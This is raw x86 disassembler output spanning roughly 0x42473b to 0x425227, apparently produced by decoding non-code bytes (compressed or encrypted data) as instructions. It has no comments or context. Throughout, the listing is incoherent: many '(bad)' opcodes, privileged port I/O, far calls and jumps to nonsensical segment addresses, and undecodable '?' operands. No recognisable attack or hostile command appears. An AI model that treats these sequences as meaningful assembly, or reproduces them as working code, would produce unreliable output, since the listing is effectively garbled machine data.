  42473b:	stos   DWORD PTR es:[edi],eax
  42473c:	lods   eax,DWORD PTR ds:[esi]
  42473d:	and    ebp,esi
  42473f:	fisttp QWORD PTR [ebx]
  424741:	sub    DWORD PTR [ecx-0x30],esp
  424744:	push   0xffffff84
  424746:	add    DWORD PTR [eax],eax
  424748:	cmc    
  424749:	add    BYTE PTR [eax],al
  42474b:	add    dl,dl
  42474d:	mov    ds:0xca597d34,eax
  424752:	ins    DWORD PTR es:[edi],dx
  424753:	mov    bh,0x9b
  424755:	sbb    DWORD PTR [esi+eiz*8],edi
  424758:	out    dx,al
  424759:	mov    WORD PTR [ecx+0x5182a9a6],gs
  42475f:	cmp    al,0x4c
  424761:	in     eax,dx
  424762:	push   0xffffffa8
  424764:	push   0x5544d46c
  424769:	js     0x4247c9
  42476b:	sbb    eax,0x7a979481
  424770:	mov    ds:0x3817af9c,al
  424775:	mov    eax,gs
  424777:	sub    al,ch
  424779:	lods   eax,DWORD PTR ds:[esi]
  42477a:	test   eax,0xe8ea764e
  42477f:	xchg   ecx,eax
  424780:	cs cmp al,0xd2
  424783:	dec    ecx
  424784:	fadd   QWORD PTR [ecx-0x42]
  424787:	add    al,0x2b
  424789:	stos   DWORD PTR es:[edi],eax
  42478a:	xchg   bl,ch
  42478c:	aam    0x84
  42478e:	mov    esp,0x373b1fdf
  424793:	test   BYTE PTR [esi+0x2d],0x61
  424797:	inc    esi
  424798:	mov    ecx,DWORD PTR [ebx+ebx*8+0x72]
  42479c:	xor    BYTE PTR [edx+0x76882586],0x50
  4247a3:	loopne 0x424799
  4247a5:	sbb    eax,0x720590bf
  4247aa:	push   ecx
  4247ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247ac:	(bad)  
  4247ad:	xchg   DWORD PTR cs:[ebx],esp
  4247b0:	push   0xfffffff7
  4247b2:	imul   esp,DWORD PTR [ebx-0x13c5382f],0x75c373d1
  4247bc:	int    0xe8
  4247be:	mov    ch,0xcb
  4247c0:	data16 add BYTE PTR [eax+0x3522d91a],0x5f
  4247c8:	(bad)  
  4247c9:	mov    ecx,0x41ccb5cf
  4247ce:	mov    ch,0x55
  4247d0:	sbb    ch,BYTE PTR [esi+0x7e6d282e]
  4247d6:	jno    0x4247bf
  4247d8:	jle    0x4247ec
  4247da:	(bad)  
  4247db:	jbe    0x4247e8
  4247dd:	sahf   
  4247de:	xor    eax,0xaffb56a9
  4247e3:	cs mov dl,0x4e
  4247e6:	scas   al,BYTE PTR es:[edi]
  4247e7:	sub    BYTE PTR [ebx-0x75],al
  4247ea:	xor    DWORD PTR [ebp-0x61a8b714],ebx
  4247f0:	xor    cl,BYTE PTR [edi-0x72]
  4247f3:	cli    
  4247f4:	cmp    dl,BYTE PTR [edx+edx*8]
  4247f7:	and    al,0x2e
  4247f9:	dec    esp
  4247fa:	inc    edx
  4247fb:	loopne 0x424840
  4247fd:	(bad)  
  4247fe:	fild   DWORD PTR [edi]
  424800:	dec    edx
  424801:	outs   dx,BYTE PTR ds:[esi]
  424802:	(bad)  
  424803:	jb     0x4247d8
  424805:	sar    BYTE PTR [ecx+edx*2],cl
  424808:	pop    ebx
  424809:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42480a:	(bad)  
  42480b:	fsubrp st(7),st
  42480d:	popa   
  42480e:	jno    0x4247c9
  424810:	mov    ds:0xa7e36358,al
  424815:	jl     0x424847
  424817:	xchg   esi,eax
  424818:	enter  0xe867,0xb8
  42481c:	rcr    si,0xb2
  424820:	push   ebx
  424821:	call   0x9c0a:0x299ea22e
  424828:	pop    edx
  424829:	mov    edx,0x654db21e
  42482e:	cmp    bl,BYTE PTR [ebx]
  424830:	adc    ebp,ebx
  424832:	jecxz  0x42480a
  424834:	cwde   
  424835:	mov    dl,0x4a
  424837:	pusha  
  424838:	mov    DWORD PTR [esi+edi*2],esi
  42483b:	nop
  42483c:	(bad)  
  42483d:	faddp  st(3),st
  42483f:	int    0xd6
	...
  4248b1:	add    BYTE PTR [eax],al
  4248b3:	add    BYTE PTR [edx-0x770e5c],cl
  4248b9:	(bad)  
  4248bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248bc:	arpl   WORD PTR [ecx+0x31],dx
  4248bf:	je     0x424881
  4248c1:	pop    ds
  4248c2:	inc    edx
  4248c3:	mov    ecx,0x1855f
  4248c8:	cmc    
  4248c9:	add    BYTE PTR [eax],al
  4248cb:	add    BYTE PTR [ebp+0x53e76039],dl
  4248d1:	adc    cl,BYTE PTR [edi-0x3e]
  4248d4:	sbb    bh,BYTE PTR [edx+0x22]
  4248d7:	xchg   esp,eax
  4248d8:	push   esi
  4248d9:	xor    al,0x57
  4248db:	add    DWORD PTR [ecx+0x6f],edx
  4248de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248df:	mov    ebp,0x208a04a7
  4248e4:	ret    
  4248e5:	call   0xa436:0x9b7ae5d8
  4248ec:	dec    ecx
  4248ee:	shr    DWORD PTR [ebp*2+0x31864095],0x2a
  4248f6:	les    edi,FWORD PTR [esi+0x3f47671]
  4248fc:	call   0x48b0:0x7115c6a2
  424903:	sbb    al,0x3e
  424905:	or     eax,0xfcb188a8
  42490a:	retf   0x587a
  42490d:	mov    al,ds:0xc51f8e8c
  424912:	imul   ch
  424914:	cmp    eax,DWORD PTR ds:0x769f3c14
  42491a:	mov    BYTE PTR [eax+ebp*4+0x4f],dh
  42491e:	push   es
  42491f:	call   edi
  424921:	clc    
  424922:	(bad)  
  424923:	mov    dh,0xef
  424925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424926:	in     eax,0x5d
  424928:	(bad)  
  42492a:	enter  0xc63a,0x3b
  42492e:	mov    eax,0xe1068538
  424933:	inc    esi
  424934:	xlat   BYTE PTR ds:[ebx]
  424935:	retf   0x3370
  424938:	jmp    0x4b6d:0xff3fd585
  42493f:	cld    
  424940:	retf   
  424941:	cmp    ch,al
  424943:	jle    0x424924
  424945:	jg     0x424952
  424947:	mov    al,0x4d
  424949:	jmp    0x522:0xc21a048
  424950:	lea    eax,[ebx+ecx*4+0x64733ebd]
  424957:	cwde   
  424958:	mov    bl,0xa8
  42495a:	imul   eax,ebx,0x4d
  42495d:	mov    DWORD PTR [edx-0x62],edx
  424960:	pop    esi
  424961:	cld    
  424962:	mov    ecx,0x6e02778d
  424967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424968:	push   0x18
  42496a:	inc    eax
  42496b:	or     eax,0xd1426660
  424970:	in     al,0xf1
  424972:	xchg   ebx,eax
  424973:	pop    es
  424974:	ss jmp 0x83e39073
  42497a:	(bad)  
  42497b:	loope  0x42493f
  42497d:	fbld   TBYTE PTR [edi]
  42497f:	sbb    BYTE PTR [ebp+0x55897439],bl
  424985:	xor    eax,0x2e34cb89
  42498a:	mov    ebx,0x8748ad63
  42498f:	aam    0x8e
  424991:	jmp    0x32129f9a
  424996:	push   eax
  424997:	add    eax,0xc2237683
  42499c:	mov    eax,ds:0x678761fc
  4249a1:	pop    eax
  4249a2:	scas   al,BYTE PTR es:[edi]
  4249a3:	mov    ebx,0xf413ecd6
  4249a8:	fwait
  4249a9:	sar    cl,cl
  4249ab:	sbb    al,0xf7
  4249ad:	stos   DWORD PTR es:[edi],eax
  4249ae:	mov    al,bh
  4249b0:	mul    BYTE PTR es:[edx]
  4249b3:	std    
  4249b4:	je     0x424976
  4249b6:	sbb    eax,0x6783c8ff
  4249bb:	sbb    cl,BYTE PTR [ecx+0x9cf5b8d]
	...
  424a31:	add    BYTE PTR [eax],al
  424a33:	add    BYTE PTR [eax],dh
  424a35:	cmp    eax,0xdf7d9f75
  424a3a:	cli    
  424a3b:	mov    edi,0x13301881
  424a40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a41:	mov    dh,0x1b
  424a43:	mov    ss,WORD PTR [esi+eax*4+0x1]
  424a47:	add    ch,dh
  424a49:	add    BYTE PTR [eax],al
  424a4b:	add    BYTE PTR [edi+0x7d],ah
  424a4e:	cmc    
  424a4f:	ins    BYTE PTR es:[edi],dx
  424a50:	ss stos BYTE PTR es:[edi],al
  424a52:	add    dh,dl
  424a54:	mov    ebx,0x724e4e2d
  424a59:	mov    esp,tr7
  424a5c:	scas   eax,DWORD PTR es:[edi]
  424a5d:	cmp    edi,ecx
  424a5f:	es out dx,eax
  424a61:	xchg   ecx,eax
  424a62:	(bad)  
  424a63:	sub    DWORD PTR ds:0x1c97e92c,eax
  424a69:	and    esi,DWORD PTR [eax-0x5b]
  424a6c:	mov    dl,0x7b
  424a6e:	das    
  424a6f:	adc    DWORD PTR [ebx],ecx
  424a71:	icebp  
  424a72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a73:	int3   
  424a74:	or     ebp,DWORD PTR [eax+0x58]
  424a77:	add    al,0x62
  424a79:	and    eax,0xf75fdf80
  424a7e:	imul   edi,DWORD PTR [eax+0x153d0d13],0x4b
  424a85:	jl     0x424a2e
  424a87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a88:	fs mov esp,0xbaf5b6e1
  424a8e:	stos   DWORD PTR es:[edi],eax
  424a8f:	test   eax,0x9c4f14a2
  424a94:	xchg   BYTE PTR [edi-0x57],dl
  424a97:	adc    BYTE PTR [eax],cl
  424a99:	cmp    ah,cl
  424a9b:	sbb    al,0xe0
  424a9d:	jmp    0x424a8a
  424a9f:	(bad)  
  424aa1:	xor    BYTE PTR [esi+ebx*8],al
  424aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424aa5:	scas   eax,DWORD PTR es:[edi]
  424aa6:	scas   eax,DWORD PTR es:[edi]
  424aa7:	sbb    cl,BYTE PTR [esi-0xd]
  424aaa:	mov    eax,ds:0xcb26450d
  424aaf:	arpl   WORD PTR [ebp+0x3],di
  424ab2:	daa    
  424ab3:	mov    ah,0xea
  424ab5:	pushf  
  424ab6:	add    al,0x3c
  424ab8:	das    
  424ab9:	rcr    DWORD PTR [esp],0x22
  424abd:	mov    edi,0xe85fa98
  424ac2:	int    0x78
  424ac4:	(bad)  
  424ac5:	repnz pop ebp
  424ac7:	adc    ch,ch
  424ac9:	loopne 0x424b21
  424acb:	sub    bl,BYTE PTR [edx-0x22cabd28]
  424ad1:	jns    0x424b0e
  424ad3:	dec    ebx
  424ad4:	mov    esi,0xbe89706
  424ad9:	mov    al,ds:0xca2a30c6
  424ade:	inc    edx
  424adf:	push   esi
  424ae0:	loop   0x424a6c
  424ae2:	ror    BYTE PTR [eax],0xee
  424ae5:	rsqrtps xmm0,XMMWORD PTR [edx+0xa]
  424ae9:	aaa    
  424aea:	inc    ebp
  424aeb:	stc    
  424aec:	inc    esi
  424aed:	adc    al,0x29
  424aef:	mul    ebp
  424af1:	imul   edi,DWORD PTR [ebx+0x67],0x3970c6b3
  424af8:	push   ds
  424af9:	and    dh,BYTE PTR [esi+0x72]
  424afc:	and    DWORD PTR ds:0xa4013196,esp
  424b02:	mov    esi,?
  424b04:	add    DWORD PTR [edx+0x1c],ebp
  424b07:	into   
  424b08:	fidivr WORD PTR [esi-0x6f]
  424b0b:	scas   eax,DWORD PTR es:[edi]
  424b0c:	in     eax,dx
  424b0d:	mov    si,0xfbb6
  424b11:	inc    edi
  424b12:	in     al,dx
  424b13:	dec    BYTE PTR [ebp+0x2e]
  424b16:	inc    ebx
  424b17:	and    eax,0xcbd96872
  424b1c:	stc    
  424b1d:	and    eax,DWORD PTR [ebx+0x45c502b]
  424b23:	cdq    
  424b24:	pop    esp
  424b25:	and    eax,0x2d914818
  424b2a:	add    DWORD PTR [ebp-0x1a2201b9],ebx
  424b30:	int    0x74
  424b32:	rcr    DWORD PTR [esi-0xf],1
  424b35:	pop    eax
  424b36:	jmp    0x3439:0x479d6213
  424b3d:	xor    edi,DWORD PTR [edx]
  424b3f:	fs push ebp
	...
  424bb1:	add    BYTE PTR [eax],al
  424bb3:	add    ch,bh
  424bb5:	(bad)  
  424bb6:	test   eax,0xff57ab46
  424bbb:	jmp    FWORD PTR [edx+0x3246077f]
  424bc1:	push   0xffffffd5
  424bc3:	dec    BYTE PTR [ecx-0x79]
  424bc6:	add    DWORD PTR [eax],eax
  424bc8:	cmc    
  424bc9:	add    BYTE PTR [eax],al
  424bcb:	add    BYTE PTR [eax-0x79],ah
  424bce:	jp     0x424b7d
  424bd0:	sbb    dl,BYTE PTR [ebp+edx*2-0x6d8a5963]
  424bd7:	jb     0x424ba4
  424bd9:	(bad)  
  424bda:	rcr    BYTE PTR [ecx-0x74dfd344],cl
  424be0:	jae    0x424bc4
  424be2:	sbb    al,0xcc
  424be4:	pop    edi
  424be5:	ss ret 
  424be7:	mov    ah,0x6b
  424be9:	jp     0x424c2f
  424beb:	scas   eax,DWORD PTR es:[edi]
  424bec:	in     al,0xc3
  424bee:	add    BYTE PTR cs:[ecx-0x699e840d],0x3a
  424bf6:	test   al,0x96
  424bf8:	test   DWORD PTR [esi],0x7f5c0bf1
  424bfe:	retf   
  424bff:	mov    eax,ds:0xcc484135
  424c04:	out    dx,eax
  424c05:	fild   WORD PTR [edx-0x55]
  424c08:	mov    edi,0xa1ed49c0
  424c0d:	push   ebx
  424c0e:	sbb    cl,BYTE PTR ds:0x145ef4a3
  424c14:	mov    esp,0x73ec8620
  424c19:	dec    esp
  424c1a:	pop    es
  424c1b:	into   
  424c1c:	lods   eax,DWORD PTR ds:[esi]
  424c1d:	retf   0x6d7d
  424c20:	(bad)  
  424c21:	fidivr WORD PTR ds:0x729552c9
  424c27:	push   ecx
  424c28:	adc    al,0xff
  424c2a:	pop    ebp
  424c2b:	retf   
  424c2c:	loope  0x424bbd
  424c2e:	mul    DWORD PTR [eax-0x24]
  424c31:	in     eax,dx
  424c32:	jno    0x424c32
  424c34:	xor    ebx,esp
  424c36:	pop    ds
  424c37:	cmp    DWORD PTR [ecx-0x41],ebp
  424c3a:	push   ebp
  424c3b:	loope  0x424bf0
  424c3d:	mov    ch,0xb
  424c3f:	mov    al,ds:0xad2fd8bf
  424c44:	xchg   ebp,eax
  424c45:	mov    ebx,0xde7ac5c0
  424c4a:	push   ds
  424c4b:	add    eax,0x863c32ae
  424c50:	push   ebx
  424c51:	xor    eax,0x39a803a6
  424c56:	(bad)  
  424c57:	in     eax,dx
  424c58:	aad    0x83
  424c5a:	daa    
  424c5b:	out    dx,eax
  424c5c:	cmp    al,0x6d
  424c5e:	mov    bl,0x59
  424c60:	ret    0xc797
  424c63:	add    BYTE PTR [eax-0x1c],dh
  424c66:	mov    ds:0x2fbe24e4,al
  424c6b:	sbb    dl,ah
  424c6d:	cwde   
  424c6e:	pushf  
  424c6f:	cmp    dl,ch
  424c71:	and    edx,ebx
  424c73:	les    edi,FWORD PTR [edx]
  424c75:	fs push edi
  424c77:	jo     0x424cc3
  424c79:	jp     0x424c84
  424c7b:	mov    DWORD PTR [ebp+0x40],edx
  424c7e:	pop    eax
  424c7f:	or     BYTE PTR [ecx],ch
  424c81:	push   ebx
  424c82:	add    edx,DWORD PTR [eax]
  424c84:	pushf  
  424c85:	std    
  424c86:	jo     0x424cfa
  424c88:	xor    cl,BYTE PTR [ebx-0x4]
  424c8b:	fucomi st,st(6)
  424c8d:	cmp    al,0xd0
  424c8f:	jb     0x424c41
  424c91:	pop    edx
  424c92:	dec    ebx
  424c93:	mov    esi,0x106d7dd5
  424c98:	sar    DWORD PTR [edi-0x278b3d37],0x6a
  424c9f:	jle    0x424c25
  424ca1:	push   edx
  424ca2:	add    DWORD PTR [esi-0x15],ecx
  424ca5:	push   edx
  424ca6:	jmp    0x9f22:0x9b3a1c28
  424cad:	ret    
  424cae:	inc    ecx
  424caf:	sbb    ecx,eax
  424cb1:	rcr    BYTE PTR [esp+ecx*8],1
  424cb4:	stos   BYTE PTR es:[edi],al
  424cb5:	js     0x424c8e
  424cb7:	cmp    dh,bl
  424cb9:	fldenv [ebp+0x499f8725]
  424cbf:	arpl   si,cx
	...
  424d31:	add    BYTE PTR [eax],al
  424d33:	add    BYTE PTR [edx-0xa],ah
  424d36:	xchg   DWORD PTR [ecx],ecx
  424d38:	xchg   edi,eax
  424d39:	jns    0x424d29
  424d3b:	inc    DWORD PTR [ecx+ecx*4+0x285894d7]
  424d42:	jmp    0x1ca8c02
  424d47:	add    ch,dh
  424d49:	add    BYTE PTR [eax],al
  424d4b:	add    BYTE PTR [ecx-0x25264a9],al
  424d51:	les    ecx,FWORD PTR [edi]
  424d53:	adc    esi,DWORD PTR [edx]
  424d55:	jp     0x424d7f
  424d57:	int3   
  424d58:	push   0xcb236b2a
  424d5d:	mov    dl,0x5
  424d5f:	or     dl,BYTE PTR [edi+0x9]
  424d62:	and    al,0x43
  424d64:	std    
  424d65:	in     eax,dx
  424d66:	loop   0x424d18
  424d68:	mov    ah,0x97
  424d6a:	bound  eax,QWORD PTR [ebp+esi*4+0x76487fe6]
  424d71:	(bad)  
  424d72:	fst    DWORD PTR [edi]
  424d74:	sub    eax,0x69e61145
  424d79:	(bad)  
  424d7a:	dec    ebp
  424d7c:	adc    DWORD PTR [ecx-0x1e],0xdac65483
  424d83:	daa    
  424d84:	mov    edx,ebp
  424d86:	ret    0xa5ce
  424d89:	jns    0x424d75
  424d8b:	and    BYTE PTR [edx-0x46],bl
  424d8e:	push   ss
  424d8f:	or     DWORD PTR [ecx+0x6b],ebp
  424d92:	fcomp  QWORD PTR [ebp+ebp*1+0x21]
  424d96:	sub    ch,bh
  424d98:	adc    ecx,DWORD PTR ds:0xe2ee87dc
  424d9e:	add    eax,0xe000b98d
  424da3:	xlat   BYTE PTR ds:[ebx]
  424da4:	jno    0x424e16
  424da6:	xor    eax,0x2557c439
  424dab:	lds    esp,FWORD PTR [edx]
  424dad:	das    
  424dae:	xor    dl,BYTE PTR [esp+ecx*4+0x2c37a37]
  424db5:	sbb    eax,0xfddafc3f
  424dba:	enter  0x3a64,0x8e
  424dbe:	(bad)  
  424dc0:	add    DWORD PTR [ebp-0x2b],ebp
  424dc3:	cwde   
  424dc4:	push   eax
  424dc5:	arpl   WORD PTR [edx],si
  424dc7:	pop    ebx
  424dc8:	jns    0x424db6
  424dca:	pop    ebp
  424dcb:	je     0x424e47
  424dcd:	or     DWORD PTR [edx+0x10],eax
  424dd0:	imul   ebp,DWORD PTR [eax],0x52
  424dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dd4:	stc    
  424dd5:	add    eax,0xebcf82c
  424dda:	popf   
  424ddb:	dec    esi
  424ddc:	jnp    0x424e34
  424dde:	adc    eax,0x3a1a38e3
  424de3:	ds mov esi,0x9558733a
  424de9:	add    ecx,0xdd453746
  424def:	jge    0x424d9e
  424df1:	fstp   DWORD PTR [ecx]
  424df3:	ja     0x424e32
  424df5:	rcr    BYTE PTR [eax+0x187bb7a1],cl
  424dfb:	in     al,0x4
  424dfd:	mov    dl,0x92
  424dff:	inc    ebx
  424e00:	push   ebp
  424e01:	sub    BYTE PTR ss:[edx+0x737fc5f6],0x28
  424e09:	mov    eax,ds:0xb7f50e78
  424e0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e10:	shr    BYTE PTR [eax+ebp*4],1
  424e13:	push   esi
  424e14:	add    eax,0xda1f39f4
  424e19:	outs   dx,BYTE PTR ds:[esi]
  424e1a:	mov    DWORD PTR [ebx-0x605176a2],ebx
  424e20:	push   ebp
  424e21:	adc    ebp,DWORD PTR [eax-0x77]
  424e24:	mov    dh,cl
  424e26:	inc    ebp
  424e27:	mov    WORD PTR [ecx-0x11],?
  424e2a:	push   ebx
  424e2b:	sub    BYTE PTR [ecx+0xf],ch
  424e2e:	std    
  424e2f:	push   0xffffffe3
  424e31:	add    al,BYTE PTR [esi+0x45]
  424e34:	pop    ds
  424e35:	test   eax,0x9105a619
  424e3a:	mov    ds:0x508ce36e,eax
  424e3f:	loop   0x424de5
	...
  424eb1:	add    BYTE PTR [eax],al
  424eb3:	add    BYTE PTR [esi+0x74b9649a],ch
  424eb9:	(bad)  
  424eba:	call   FWORD PTR [edi-0x6d72b26e]
  424ec0:	bound  ecx,QWORD PTR [ebx+edi*2]
  424ec3:	ja     0x424ef8
  424ec5:	mov    DWORD PTR [ecx],eax
  424ec7:	add    ch,dh
  424ec9:	add    BYTE PTR [eax],al
  424ecb:	add    BYTE PTR [edi+0x3a],ch
  424ece:	or     eax,0x86e1aae5
  424ed3:	dec    eax
  424ed4:	(bad)  
  424ed5:	pop    eax
  424ed6:	das    
  424ed7:	push   0xffffff85
  424ed9:	and    DWORD PTR [eax+0x15b8623d],ecx
  424edf:	wbinvd 
  424ee1:	cs (bad) 
  424ee3:	in     eax,0x34
  424ee5:	bound  esi,QWORD PTR [edi-0x3]
  424ee8:	pop    ecx
  424ee9:	lods   eax,DWORD PTR ds:[esi]
  424eea:	cmp    eax,0x6436a95f
  424eef:	sbb    esp,DWORD PTR [ecx+0x1a]
  424ef2:	cli    
  424ef3:	mov    edi,0x259f2c9
  424ef8:	sub    BYTE PTR [eax-0x63f9005c],dh
  424efe:	aad    0xf6
  424f00:	adc    al,0xc0
  424f02:	stc    
  424f03:	bound  esp,QWORD PTR [esi+0x3a5dec84]
  424f09:	jg     0x424eb7
  424f0b:	mov    bl,0x74
  424f0d:	lods   eax,DWORD PTR ds:[esi]
  424f0e:	add    eax,0xb49b5d8d
  424f13:	lds    eax,FWORD PTR [edx+0xf91d9fe]
  424f19:	ss cmp al,0xe6
  424f1c:	lods   al,BYTE PTR ds:[esi]
  424f1d:	ds loope 0x424eaa
  424f20:	aaa    
  424f21:	scas   eax,DWORD PTR es:[edi]
  424f22:	sub    al,0x52
  424f24:	inc    esp
  424f25:	(bad)  
  424f26:	loope  0x424ec4
  424f28:	xor    ebx,0x1ef973fe
  424f2e:	jb     0x424f76
  424f30:	inc    eax
  424f31:	int3   
  424f32:	sbb    bl,BYTE PTR [edi+ebx*8+0x77]
  424f36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f37:	mov    bl,0xc0
  424f39:	out    0x56,eax
  424f3b:	bound  ecx,QWORD PTR [eax+0x289f3e15]
  424f41:	add    BYTE PTR [eax-0x71c88791],cl
  424f47:	mov    ?,edx
  424f49:	js     0x424fb9
  424f4b:	xchg   edi,eax
  424f4c:	push   ss
  424f4d:	std    
  424f4e:	pop    ss
  424f4f:	je     0x424f38
  424f51:	aaa    
  424f52:	icebp  
  424f53:	xchg   ebp,eax
  424f54:	xor    BYTE PTR [ebp-0x60],dh
  424f57:	pushf  
  424f58:	mov    al,0xe7
  424f5a:	sbb    BYTE PTR [ebx-0x36053b01],bl
  424f60:	imul   ecx,esp,0xfc556618
  424f66:	std    
  424f67:	call   0x7ddd:0x30988b14
  424f6e:	daa    
  424f6f:	xchg   DWORD PTR [ebx-0x66a451ec],esp
  424f75:	stc    
  424f76:	jne    0x424f39
  424f78:	loop   0x424ff5
  424f7a:	and    edi,DWORD PTR [edx]
  424f7c:	pop    edi
  424f7d:	cmp    DWORD PTR [ebp+0x7c],esi
  424f80:	push   ebp
  424f81:	hlt    
  424f82:	jae    0x424f82
  424f84:	push   es
  424f85:	xor    dh,BYTE PTR [edi+0x66]
  424f88:	retf   0x917
  424f8b:	add    eax,0x5951d14
  424f90:	push   ss
  424f91:	cmc    
  424f92:	push   ebx
  424f93:	adc    eax,DWORD PTR [ebx]
  424f95:	or     al,0x67
  424f97:	ss inc ebx
  424f99:	xor    dh,BYTE PTR [edi+0x2f7ce7f8]
  424f9f:	jg     0x424fb5
  424fa1:	and    bl,BYTE PTR [ebx]
  424fa3:	gs push 0xffffffdd
  424fa6:	stos   DWORD PTR es:[edi],eax
  424fa7:	dec    edi
  424fa8:	(bad)  
  424fa9:	cs call 0xf6b7:0x42b0ff38
  424fb1:	and    BYTE PTR [ebx+0x74c01fae],al
  424fb7:	rol    BYTE PTR [ecx-0x60393f1],1
  424fbd:	pop    ss
  424fbe:	mov    ds:0x2c3b,al
	...
  425033:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  425037:	mov    cl,0x2e
  425039:	idiv   edi
  42503b:	fst    st(3)
  42503d:	inc    eax
  42503e:	sahf   
  42503f:	pop    ds
  425040:	mov    eax,ds:0x286d9be6
  425045:	mov    al,BYTE PTR [ecx]
  425047:	add    ch,dh
  425049:	add    BYTE PTR [eax],al
  42504b:	add    cl,al
  42504d:	scas   al,BYTE PTR es:[edi]
  42504e:	in     al,0x19
  425050:	frstor [edx-0x7f2d9f68]
  425056:	aam    0x84
  425058:	xor    al,dl
  42505a:	fnstsw WORD PTR [esi]
  42505c:	stc    
  42505d:	iret   
  42505e:	jns    0x4250a7
  425060:	push   edi
  425061:	jbe    0x425040
  425063:	fwait
  425064:	jb     0x424ff8
  425066:	inc    esi
  425067:	ins    BYTE PTR es:[edi],dx
  425068:	hlt    
  425069:	call   DWORD PTR [ecx]
  42506b:	retf   0x6689
  42506e:	mov    bl,0xb3
  425070:	(bad)  
  425071:	sbb    DWORD PTR [edi],esi
  425073:	pop    edx
  425074:	call   0x4654:0x7f6068c
  42507b:	pop    edx
  42507c:	jmp    0x3ffa8f6d
  425081:	test   BYTE PTR [eax-0x31],0x65
  425085:	ja     0x425083
  425087:	dec    edx
  425088:	dec    ebx
  425089:	jb     0x42502f
  42508b:	rcl    DWORD PTR [edi-0x377837a4],1
  425091:	jnp    0x425031
  425093:	ss clc 
  425095:	mov    ds:0xe29bad07,eax
  42509a:	sti    
  42509b:	js     0x425090
  42509d:	adc    eax,edi
  42509f:	gs ins DWORD PTR es:[edi],dx
  4250a1:	(bad)  [ebx+0x20c46f19]
  4250a7:	jae    0x425083
  4250a9:	imul   BYTE PTR [eax+0x12]
  4250ac:	loop   0x4250ca
  4250ae:	sbb    DWORD PTR [esi+0x478b8634],edx
  4250b4:	pop    eax
  4250b5:	leave  
  4250b6:	jge    0x4250ec
  4250b8:	in     eax,0x61
  4250ba:	jp     0x425110
  4250bc:	hlt    
  4250bd:	mov    bl,0x5d
  4250bf:	sub    ebx,DWORD PTR [edi]
  4250c1:	push   esp
  4250c2:	sub    ebp,DWORD PTR ds:0xedf5db82
  4250c8:	call   0x6cfc6cc
  4250cd:	nop
  4250ce:	mov    WORD PTR [ecx],es
  4250d0:	jl     0x425101
  4250d2:	dec    esi
  4250d3:	int    0xb6
  4250d5:	xor    ebx,edi
  4250d7:	sti    
  4250d8:	or     esp,DWORD PTR [ecx-0x75]
  4250db:	loopne 0x425074
  4250dd:	inc    ebp
  4250de:	jno    0x4250c0
  4250e0:	rol    ebp,cl
  4250e2:	hlt    
  4250e3:	add    BYTE PTR [eax-0x50],cl
  4250e6:	pop    ds
  4250e7:	ror    BYTE PTR [edi-0x80],cl
  4250ea:	hlt    
  4250eb:	rcr    DWORD PTR [ecx+0x760e750c],cl
  4250f1:	fcom   QWORD PTR [ebp+ebx*8-0x9e42443]
  4250f8:	pop    esp
  4250f9:	loop   0x425101
  4250fb:	pop    eax
  4250fc:	cli    
  4250fd:	sbb    BYTE PTR [eax-0xc],dh
  425100:	push   ds
  425101:	leave  
  425102:	nop
  425103:	xchg   ebx,eax
  425104:	fsub   QWORD PTR [esi-0x6d]
  425107:	add    eax,0x3184bf4c
  42510c:	in     eax,dx
  42510d:	pop    eax
  42510e:	xor    DWORD PTR [esi-0x34],esp
  425111:	arpl   WORD PTR [ecx+0x7efc5d4],si
  425117:	sbb    BYTE PTR [edi+0x2],cl
  42511a:	and    eax,0x9b70a712
  42511f:	(bad)  
  425120:	nop
  425121:	imul   ebp,DWORD PTR [ecx-0x6080b83f],0xa768c659
  42512b:	mov    ds:0x88a6c785,eax
  425130:	ror    BYTE PTR [edx+0x4a],1
  425133:	xor    BYTE PTR [ebx],0x1
  425136:	inc    esp
  425137:	out    dx,al
  425138:	(bad)  
  425139:	mov    dl,0x1
  42513b:	mov    bl,0x89
  42513d:	xor    ebp,DWORD PTR [ebp+0xd952]
	...
  4251b3:	add    BYTE PTR [edi-0x4c275c4c],al
  4251b9:	(bad)  
  4251bb:	call   DWORD PTR [esi+0x14]
  4251be:	and    esp,esi
  4251c0:	stc    
  4251c1:	lahf   
  4251c2:	and    al,0x4f
  4251c4:	sbb    eax,0xf500018b
  4251c9:	add    BYTE PTR [eax],al
  4251cb:	add    BYTE PTR ds:0xb0705d17,ah
  4251d1:	dec    eax
  4251d2:	imul   esp,DWORD PTR [esi+esi*2+0x62],0x82bb1b55
  4251da:	push   ecx
  4251db:	test   BYTE PTR [esi+0x5912b3d8],bh
  4251e1:	inc    edx
  4251e2:	test   bh,al
  4251e4:	jo     0x42522a
  4251e6:	xchg   BYTE PTR [eax-0x42],ch
  4251e9:	add    eax,0x56cdf782
  4251ee:	inc    edi
  4251ef:	sub    edx,DWORD PTR [ebx]
  4251f1:	lods   eax,DWORD PTR ds:[esi]
  4251f2:	into   
  4251f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251f4:	mov    ds:0x2d22f19e,al
  4251f9:	mov    cl,0xa
  4251fb:	sbb    BYTE PTR [ebx+0x3e],dl
  4251fe:	mov    esi,0x4bc8ba51
  425203:	daa    
  425204:	stos   DWORD PTR es:[edi],eax
  425205:	and    DWORD PTR [ebp-0x7d3790e2],0xffffffa4
  42520c:	mov    dh,0xb8
  42520e:	inc    ecx
  42520f:	fadd   QWORD PTR [edx]
  425211:	or     DWORD PTR [edx],ebx
  425213:	(bad)  
  425215:	jo     0x42521a
  425217:	daa    
  425218:	cmp    BYTE PTR [edi-0xf489f48],cl
  42521e:	bound  eax,QWORD PTR [ecx+ebx*1-0x6cf3731c]
  425225:	adc    DWORD PTR [edx],ecx
  425227:	add    esp,ebp
